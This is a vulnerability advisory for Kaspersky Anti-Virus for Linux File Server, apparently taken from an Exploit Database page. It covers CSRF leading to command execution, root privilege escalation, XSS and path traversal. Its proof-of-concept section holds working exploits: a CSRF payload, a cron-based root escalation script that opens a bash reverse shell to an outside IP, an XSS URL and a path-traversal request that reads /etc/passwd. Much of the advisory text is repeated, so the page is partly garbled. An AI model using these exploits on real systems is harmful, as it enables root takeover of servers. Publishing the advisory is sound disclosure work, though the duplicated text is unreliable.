```
1. *Advisory Information*

Title: Kaspersky Anti-Virus File Server Multiple Vulnerabilities
Advisory ID: CORE-2017-0003
Advisory URL:
<http://www.coresecurity.com/advisories/Kaspersky-Anti-Virus-File-Server-Multiple-Vulnerabilities>
Date published: 2017-06-28
Date of last update: 2017-06-28
Vendors contacted: Kaspersky
Release mode: Forced release

2. *Vulnerability Information*

Class: Improper Neutralization of Input During Web Page Generation
('Cross-site Scripting') [CWE-79], Cross-Site Request Forgery [CWE-352],
Improper Privilege Management [CWE-269], Improper Limitation of a
Pathname to a Restricted Directory [CWE-22]
Impact: Code execution, Security bypass, Information leak
Remotely Exploitable: Yes
Locally Exploitable: Yes
CVE Name: CVE-2017-9813, CVE-2017-9810, CVE-2017-9811, CVE-2017-9812

3. *Vulnerability Description*

From Kaspersky Lab's website:
"Large corporate networks that use file servers running on different
platforms can be a real headache when it comes to antivirus protection.
Kaspersky Anti-Virus for Linux File Server is part of our range of new
and refreshed products, solutions and services for heterogeneous
networks. It provides a superior protection with Samba server
integration and other features that can protect workstations and file
servers in even the most complex heterogeneous networks. It is also
certified VMware Ready and supports current versions of FreeBSD for
integrated, future-proof protection."

Multiple vulnerabilities were found in the Kaspersky Anti-Virus for
Linux File Server [2] Web Management Console. It is possible for a
remote attacker to abuse these vulnerabilities and gain command
execution as root.

4. *Vulnerable Packages*

. Kaspersky Anti-Virus for Linux File Server 8.0.3.297 [2]
Other products and versions might be affected, but they were not tested.

5. *Vendor Information, Solutions and Workarounds*

Kaspersky [1] published the following Maintenance Pack:
   . Maintenance Pack 2 Critical Fix 4 (version 8.0.4.312):
   <https://support.kaspersky.com/13738/>

6. *Credits*

This vulnerability was discovered and researched by Leandro Barragan
and Maximiliano Vidal from Core Security Consulting Services. The
publication of this advisory was coordinated by Alberto Solino from
Core Advisories Team.

7. *Technical Description / Proof of Concept Code*

Kaspersky Anti-virus for Linux File Server comes bundled with a Web
Management Console to monitor the application's status and manage its
operation.

One specific feature allows configuring shell scripts to be executed
when certain events occur. This functionality is vulnerable to
cross-site request forgery, allowing code execution in the context of
the web application as the kluser account. The vulnerability is
described in section 7.1.

Moreover, it is possible to elevate privileges from kluser to root by
abusing the quarantine functionality provided by the kav4fs-control
system binary. This is described in section 7.2.

Additional web application vulnerabilities were found, including a
reflected cross-site scripting vulnerability (7.3) and a path traversal
vulnerability (7.4).

7.1. *Cross-site Request Forgery leading to Remote Command Execution*

[CVE-2017-9810]: There are no Anti-CSRF tokens in any forms on the web
interface. This would allow an attacker to submit authenticated requests
when an authenticated user browses an attacker-controlled domain.

The following request will update the notification settings to run a
shell command when an object is moved to quarantine. For the full list
of events refer to the product's documentation. Note that it is possible
to add a script to all existing events in a single request, widening the
window of exploitation.

The proof-of-concept creates the file /tmp/pepperoni. Shell commands
are run as the lower privilege kluser.

Payload:
/-----
"notifier": {"Actions": [{"Command": "touch /tmp/pepperoni",
"EventName": 22, "Enable": true, "__VersionInfo": "1 0"}]

7.2. *Privilege escalation due to excessive permissions*

[CVE-2017-9811]: The kluser is able to interact with the kav4fs-control
binary. By abusing the quarantine read and write operations, it is
possible to elevate the privileges to root.

The following proof-of-concept script adds a cron job that will be
executed as root.

/-----
# Make sure the application is running
/opt/kaspersky/kav4fs/bin/kav4fs-control --start-app

# Create cron job in /tmp
echo "* * * * * root /tmp/reverse.sh" > /tmp/badcron

# Sample reverse shell payload
cat > /tmp/reverse.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/172.16.76.1/8000 0>&1
EOF
chmod +x /tmp/reverse.sh

# Move the cron job to quarantine and grab the object ID
QUARANTINE_ID=$(/opt/kaspersky/kav4fs/bin/kav4fs-control -Q
--add-object /tmp/badcron | cut -d'=' -f2 | cut -d'.' -f1)

# Restore the file to /etc/cron.d
/opt/kaspersky/kav4fs/bin/kav4fs-control -Q --restore $QUARANTINE_ID
--file /etc/cron.d/implant
-----/

7.3. *Reflected cross-site scripting*

[CVE-2017-9813]: The scriptName parameter of the licenseKeyInfo action
method is vulnerable to cross-site scripting.

/-----
http://<server
IP>:9080/cgi-bin/cgictl?action=licenseKeyInfo&do_action=licenseKeyInfo&scriptName=</script><img+src%3dx+onerror%3d"alert(1)"%3b/>&active=&licenseKey=bla
-----/

7.4. *Path traversal*

[CVE-2017-9812]: The reportId parameter of the getReportStatus action
method can be abused to read arbitrary files with kluser privileges.
The following proof-of-concept reads the /etc/passwd file.

/-----
GET
/cgi-bin/cgictl?action=getReportStatus&reportId=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00

Multiple vulnerabilities were found in the Kaspersky Anti-Virus for
Linux File Server [2] Web Management Console. It is possible for a
remote attacker to abuse these vulnerabilities and gain command
execution as root.

4. *Vulnerable Packages*

. Kaspersky Anti-Virus for Linux File Server 8.0.3.297 [2]
Other products and versions might be affected, but they were not tested.

5. *Vendor Information, Solutions and Workarounds*

Kaspersky [1] published the following Maintenance Pack:
   . Maintenance Pack 2 Critical Fix 4 (version 8.0.4.312):
   https://support.kaspersky.com/13738/

6. *Credits*

This vulnerability was discovered and researched by Leandro Barragan
and Maximiliano Vidal from Core Security Consulting Services. The
publication of this advisory was coordinated by Alberto Solino from
Core Advisories Team.

7. *Technical Description / Proof of Concept Code*

Kaspersky Anti-virus for Linux File Server comes bundled with a Web
Management Console to monitor the application's status and manage its
operation.

One specific feature allows configuring shell scripts to be executed
when certain events occur. This functionality is vulnerable to
cross-site request forgery, allowing code execution in the context of
the web application as the kluser account. The vulnerability is
described in section 7.1.

Moreover, it is possible to elevate privileges from kluser to root by
abusing the quarantine functionality provided by the kav4fs-control
system binary. This is described in section 7.2.

Additional web application vulnerabilities were found, including a
reflected cross-site scripting vulnerability (7.3) and a path traversal
vulnerability (7.4).

7.1. *Cross-site Request Forgery leading to Remote Command Execution*

[CVE-2017-9810]: There are no Anti-CSRF tokens in any forms on the web
interface. This would allow an attacker to submit authenticated requests
when an authenticated user browses an attacker-controlled domain.

The following request will update the notification settings to run a
shell command when an object is moved to quarantine. For the full list
of events refer to the product's documentation. Note that it is possible
to add a script to all existing events in a single request, widening the
window of exploitation.

The proof-of-concept creates the file /tmp/pepperoni. Shell commands
are run as the lower privilege kluser.

7.2. *Privilege escalation due to excessive permissions*

[CVE-2017-9811]: The kluser is able to interact with the kav4fs-control
binary. By abusing the quarantine read and write operations, it is
possible to elevate the privileges to root.

The following proof-of-concept script adds a cron job that will be
executed as root.

/-----
# Make sure the application is running
/opt/kaspersky/kav4fs/bin/kav4fs-control --start-app

# Create cron job in /tmp
echo "* * * * * root /tmp/reverse.sh" > /tmp/badcron

# Sample reverse shell payload
cat > /tmp/reverse.sh << EOF
#!/bin/bash
bash -i >& /dev/tcp/172.16.76.1/8000 0>&1
EOF
chmod +x /tmp/reverse.sh

# Move the cron job to quarantine and grab the object ID
QUARANTINE_ID=$(/opt/kaspersky/kav4fs/bin/kav4fs-control -Q
--add-object /tmp/badcron | cut -d'=' -f2 | cut -d'.' -f1)

# Restore the file to /etc/cron.d
/opt/kaspersky/kav4fs/bin/kav4fs-control -Q --restore $QUARANTINE_ID
--file /etc/cron.d/implant
-----/

7.3. *Reflected cross-site scripting*

[CVE-2017-9813]: The scriptName parameter of the licenseKeyInfo action
method is vulnerable to cross-site scripting.

/-----
http://<server
IP>:9080/cgi-bin/cgictl?action=licenseKeyInfo&do_action=licenseKeyInfo&scriptName=</script><img+src%3dx+onerror%3d"alert(1)"%3b/>&active=&licenseKey=bla
-----/

7.4. *Path traversal*

[CVE-2017-9812]: The reportId parameter of the getReportStatus action
method can be abused to read arbitrary files with kluser privileges.
The following proof-of-concept reads the /etc/passwd file.

/-----
GET
/cgi-bin/cgictl?action=getReportStatus&reportId=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd%00

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.
